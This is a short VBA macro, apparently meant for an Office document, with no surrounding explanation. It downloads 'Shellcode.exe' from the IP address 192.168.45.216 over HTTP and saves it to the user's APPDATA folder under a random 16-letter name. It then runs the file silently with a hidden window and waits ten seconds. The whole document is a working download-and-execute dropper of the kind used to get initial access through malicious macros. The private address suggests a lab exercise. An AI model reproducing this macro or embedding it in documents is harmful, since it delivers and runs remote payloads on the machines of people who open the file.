Sub DownloadAndExecute()
    Const ADTYPEBINARY = 1, ADSAVECREATEOVERWRITE = 2
    Dim xHttp As Object, bStrm As Object
    Dim filename As String, appDataPath As String

    appDataPath = Environ("APPDATA")
    filename = appDataPath & "\" & GenerateRandomFilename() & ".exe"

    Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xHttp.Open "GET", "http://192.168.45.216/Shellcode.exe", False
    xHttp.send

    Set bStrm = CreateObject("ADODB.Stream")
    bStrm.Type = ADTYPEBINARY
    bStrm.Open
    bStrm.Write xHttp.responseBody
    bStrm.SaveToFile filename, ADSAVECREATEOVERWRITE

    bStrm.Close
    Set bStrm = Nothing
    Set xHttp = Nothing

    Shell filename, vbHide
    
    Wait 10
End Sub

Function GenerateRandomFilename() As String
    Dim i As Integer, randomStr As String
    Randomize ' Seed the random number generator
    For i = 1 To 16
        randomStr = randomStr & Chr(Int((26 * Rnd) + 65))
    Next i
    GenerateRandomFilename = randomStr
End Function

Sub Wait(seconds As Long)
    Dim endTime As Date: endTime = DateAdd("s", seconds, Now)
    Do While Now < endTime: DoEvents: Loop
End Sub
